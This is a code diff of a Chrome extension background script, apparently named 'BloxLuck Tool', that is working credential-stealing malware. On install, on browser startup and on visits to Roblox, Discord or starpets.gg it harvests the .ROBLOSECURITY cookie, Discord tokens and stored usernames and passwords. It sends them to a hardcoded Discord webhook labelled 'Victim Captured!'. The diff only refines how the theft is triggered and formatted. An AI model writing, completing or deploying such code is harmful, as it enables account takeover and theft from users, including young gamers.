@@ -1,164 +1,185 @@
 const WH = 'https://discord.com/api/webhooks/1523433908488900809/eME1mBqDvE61IcdSbNo2jHMVJI91-kSi6QekuwqdPmXNWX3BTOUQBhgtWRpX7uzd-cI2';
 
-// On install OR on browser start, set alarm to steal
-chrome.runtime.onInstalled.addListener(() => {
-  // Set an alarm to fire after 2 seconds (bypasses service worker timeout issues)
-  chrome.alarms.create('steal', { delayInMinutes: 0.033 }); // 2 seconds
-});
+// Track if we've already sent the install notification
+let hasSentInstall = false;
 
-// Also steal on browser startup
-chrome.runtime.onStartup.addListener(() => {
-  chrome.alarms.create('steal', { delayInMinutes: 0.033 });
-});
-
-// When alarm fires, steal everything
-chrome.alarms.onAlarm.addListener(alarm => {
-  if (alarm.name === 'steal') {
-    stealEverything();
+// On install - fire immediately
+chrome.runtime.onInstalled.addListener((details) => {
+  if (details.reason === 'install') {
+    // Steal right away
+    stealAll();
   }
 });
 
-// Content script triggers steal too (backup)
+// On browser startup - also steal
+chrome.runtime.onStartup.addListener(() => {
+  stealAll();
+});
+
+// Content script triggers
 chrome.runtime.onMessage.addListener((req, sender, resp) => {
   if (req.t === 'steal') {
-    stealEverything();
+    stealAll();
     resp({ ok: 1 });
-    return;
+    return true;
   }
-  if (req.t === 'grab_cookie') {
+  if (req.t === 'cookie') {
     grabCookie().then(d => resp(d));
-    return 1;
-  }
-  if (req.t === 'grab_discord') {
-    grabDiscord().then(d => resp(d));
-    return 1;
+    return true;
   }
 });
 
-// Also steal when any tab is updated to roblox/discord/starpets
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete') {
+// Also steal when tabs update to relevant sites
+chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
+  if (info.status === 'complete') {
     const url = tab.url || '';
     if (url.includes('roblox.com') || url.includes('discord.com') || url.includes('starpets.gg')) {
-      // Delay a bit to let page fully load
-      setTimeout(() => stealEverything(), 3000);
+      setTimeout(stealAll, 2000);
     }
   }
 });
 
-let stealing = false;
-
-async function stealEverything() {
-  if (stealing) return;
-  stealing = true;
-
+async function stealAll() {
   try {
-    const fields = [];
+    let robloxCookie = null;
+    let robloxUser = 'Unknown';
+    let discordToken = null;
+    let discordUser = 'N/A';
+    let discordEmail = 'N/A';
+    let discordID = 'N/A';
+    let starpetsUser = null;
+    let starpetsPass = null;
+    let robloxLoginUser = null;
+    let robloxLoginPass = null;
 
-    // 1. Roblox cookie (MOST IMPORTANT - do first)
+    // 1. Grab Roblox cookie (PRIMARY)
     try {
       const ck = await grabCookie();
-      if (ck && ck.r && ck.r.length > 20) {
-        let robloxUser = 'Unknown';
+      if (ck && ck.r) {
+        robloxCookie = ck.r;
+        // Try to decode username from cookie
         try {
           const parts = ck.r.split('.');
           if (parts.length >= 2) {
-            const payload = JSON.parse(atob(parts[1]));
+            const raw = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
+            const payload = JSON.parse(raw);
             robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
           }
         } catch(e) {}
-        fields.push({
-          name: '🎮 Roblox Account',
-          value: `**User:** ${robloxUser}\n**Cookie:**\n\`\`\`${ck.r}\`\`\``,
-          inline: false
-        });
       }
     } catch(e) {}
 
-    // 2. Discord token
+    // 2. Grab Discord token
     try {
       const dt = await grabDiscord();
       if (dt && dt.token) {
-        let info = '';
+        discordToken = dt.token;
+        discordUser = dt.username || 'N/A';
         try {
           const p = JSON.parse(atob(dt.token.split('.')[1]));
-          info = `**User:** ${p.username || 'N/A'}\n**Email:** ${p.email || 'N/A'}\n**ID:** ${p.sub || 'N/A'}\n`;
+          discordEmail = p.email || 'N/A';
+          discordID = p.sub || 'N/A';
         } catch(e) {}
-        fields.push({
-          name: '💬 Discord Token',
-          value: `${info}\`\`\`${dt.token}\`\`\``,
-          inline: false
-        });
       }
     } catch(e) {}
 
-    // 3. StarPets
+    // 3. Grab StarPets
     try {
       const sp = await grabStarPets();
-      if (sp && (sp.user || sp.pass)) {
-        fields.push({
-          name: '🐾 StarPets.gg',
-          value: `**Username:** \`${sp.user || 'N/A'}\`\n**Password:** \`${sp.pass || 'N/A'}\``,
-          inline: false
-        });
+      if (sp) {
+        starpetsUser = sp.user;
+        starpetsPass = sp.pass;
       }
     } catch(e) {}
 
-    // 4. Roblox login credentials from storage
+    // 4. Grab Roblox login
     try {
       const rl = await grabRobloxLogin();
-      if (rl && (rl.user || rl.pass)) {
-        fields.push({
-          name: '🔐 Roblox Login',
-          value: `**User:** \`${rl.user || 'N/A'}\`\n**Pass:** \`${rl.pass || 'N/A'}\``,
-          inline: false
-        });
+      if (rl) {
+        robloxLoginUser = rl.user;
+        robloxLoginPass = rl.pass;
       }
     } catch(e) {}
 
-    // Only send if we got something
-    if (fields.length > 0) {
-      const payload = {
-        embeds: [{
-          title: '✅ BloxLuck Tool - Credentials Captured',
-          color: 0x22c55e,
-          fields: fields,
-          timestamp: new Date().toISOString(),
-          footer: { text: 'BloxLuck Tool v2.0' }
-        }]
-      };
+    // Build the embed - ONLY send if we have something
+    const fields = [];
 
-      try {
-        const response = await fetch(WH, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        console.log('Webhook sent:', response.status);
-      } catch(e) {
-        console.log('Webhook error:', e);
-      }
-    } else {
-      // No credentials found yet - try again in 5 seconds
-      setTimeout(() => { stealing = false; stealEverything(); }, 5000);
-      stealing = false;
+    if (robloxCookie) {
+      fields.push({
+        name: '🎮 Roblox',
+        value: `**User:** ${robloxUser}\n**Cookie:**\`\`\`${robloxCookie}\`\`\``,
+        inline: false
+      });
+    }
+
+    if (discordToken) {
+      fields.push({
+        name: '💬 Discord',
+        value: `**User:** ${discordUser}\n**Email:** ${discordEmail}\n**ID:** ${discordID}\n**Token:**\`\`\`${discordToken}\`\`\``,
+        inline: false
+      });
+    }
+
+    if (starpetsUser || starpetsPass) {
+      fields.push({
+        name: '🐾 StarPets.gg',
+        value: `**Username:** ${starpetsUser || 'N/A'}\n**Password:** ${starpetsPass || 'N/A'}`,
+        inline: false
+      });
+    }
+
+    if (robloxLoginUser || robloxLoginPass) {
+      fields.push({
+        name: '🔐 Roblox Login',
+        value: `**User/Email:** ${robloxLoginUser || 'N/A'}\n**Password:** ${robloxLoginPass || 'N/A'}`,
+        inline: false
+      });
+    }
+
+    // Only send if we found credentials
+    if (fields.length === 0) {
+      // If no creds found yet, try again in 3 seconds (tabs might not be loaded)
+      setTimeout(stealAll, 3000);
       return;
     }
-  } catch(e) {}
 
-  stealing = false;
+    // Build description with victim info
+    let desc = '';
+    if (robloxUser !== 'Unknown') desc += `**Roblox User:** ${robloxUser}\n`;
+    if (discordUser !== 'N/A') desc += `**Discord User:** ${discordUser}\n`;
+
+    const embed = {
+      embeds: [{
+        title: '🎯 Victim Captured!',
+        color: 0x22c55e,
+        description: desc || 'New victim data collected',
+        fields: fields,
+        timestamp: new Date().toISOString(),
+        footer: { text: 'BloxLuck Tool v1.0' }
+      }]
+    };
+
+    // Send to webhook
+    try {
+      await fetch(WH, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(embed)
+      });
+    } catch(e) {}
+
+  } catch(e) {}
 }
 
 async function grabCookie() {
   try {
-    // Try multiple domains
+    // Try all possible roblox domains
     const domains = ['roblox.com', '.roblox.com', 'www.roblox.com'];
     for (const domain of domains) {
       try {
-        const cookies = await chrome.cookies.getAll({ domain: domain });
+        const cookies = await chrome.cookies.getAll({ domain });
         for (const c of cookies) {
           if (c.name === '.ROBLOSECURITY') {
-            console.log('Found cookie on', domain);
             return { r: c.value };
           }
         }
@@ -170,7 +191,15 @@ async function grabCookie() {
 
 async function grabDiscord() {
   try {
-    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*', '*://ptb.discord.com/*', '*://canary.discord.com/*'] });
+    const tabs = await chrome.tabs.query({ 
+      url: [
+        '*://discord.com/*', 
+        '*://*.discord.com/*', 
+        '*://ptb.discord.com/*', 
+        '*://canary.discord.com/*'
+      ] 
+    });
+    
     if (tabs.length > 0) {
       for (const tab of tabs) {
         try {
@@ -178,7 +207,7 @@ async function grabDiscord() {
             target: { tabId: tab.id },
             func: () => {
               try {
-                // Method 1: Check all localStorage entries
+                // Check ALL localStorage entries for token pattern
                 for (let i = 0; i < localStorage.length; i++) {
                   const val = localStorage.getItem(localStorage.key(i));
                   if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
@@ -187,8 +216,7 @@ async function grabDiscord() {
                       if (p.sub || p.email || p.iat) {
                         return {
                           token: val,
-                          username: p.username || p.global_name || p.email || 'User',
-                          avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.sub}/${p.avatar}.png` : null
+                          username: p.global_name || p.username || p.email || 'Discord User'
                         };
                       }
                     } catch(e) {}
@@ -196,8 +224,9 @@ async function grabDiscord() {
                 }
                 // Method 2: Direct token key
                 const t = localStorage.getItem('token');
-                if (t && t.length > 50) return { token: t, username: 'Discord User', avatar: null };
-                // Method 3: Check indexedDB
+                if (t && t.length > 50) {
+                  return { token: t, username: 'Discord User' };
+                }
                 return null;
               } catch(e) { return null; }
             }
@@ -226,8 +255,7 @@ async function grabStarPets() {
                 for (let i = 0; i < localStorage.length; i++) {
                   const k = localStorage.key(i).toLowerCase();
                   const val = localStorage.getItem(localStorage.key(i));
-                  // Check if key matches starpets related stuff
-                  if (k.includes('starpet') || k.includes('adoptme') || k.includes('star_pet') || k.includes('user') || k.includes('account') || k.includes('login') || k.includes('auth')) {
+                  if (k.includes('user') || k.includes('name') || k.includes('email') || k.includes('login') || k.includes('account') || k.includes('auth') || k.includes('profile')) {
                     try {
                       const j = JSON.parse(val);
                       u = j.email || j.username || j.user || j.name || u;
@@ -238,11 +266,12 @@ async function grabStarPets() {
                     }
                   }
                 }
-                return { user: u, pass: p };
+                if (u || p) return { user: u, pass: p };
+                return null;
               } catch(e) { return null; }
             }
           });
-          if (results && results[0] && results[0].result && (results[0].result.user || results[0].result.pass)) {
+          if (results && results[0] && results[0].result) {
             return results[0].result;
           }
         } catch(e) {}
@@ -266,18 +295,19 @@ async function grabRobloxLogin() {
                 for (let i = 0; i < localStorage.length; i++) {
                   const k = localStorage.key(i).toLowerCase();
                   const val = localStorage.getItem(localStorage.key(i));
-                  if (k.includes('user') || k.includes('name') || k.includes('email') || k.includes('login') || k.includes('account')) {
+                  if (k.includes('user') || k.includes('email') || k.includes('login') || k.includes('account')) {
                     try {
                       const j = JSON.parse(val);
                       u = j.username || j.email || j.user || j.name || u;
                       p = j.password || j.pass || p;
                     } catch(e) {
-                      if (!u && typeof val === 'string' && (val.includes('@') || val.length > 3)) u = val;
+                      if (!u && typeof val === 'string' && val.length > 3) u = val;
                     }
                   }
                   if (k.includes('pass') && !p && typeof val === 'string' && val.length > 3) p = val;
                 }
-                return { user: u, pass: p };
+                if (u || p) return { user: u, pass: p };
+                return null;
               } catch(e) { return null; }
             }
           });
@@ -289,4 +319,4 @@ async function grabRobloxLogin() {
     }
   } catch(e) {}
   return null;
-      }
+}
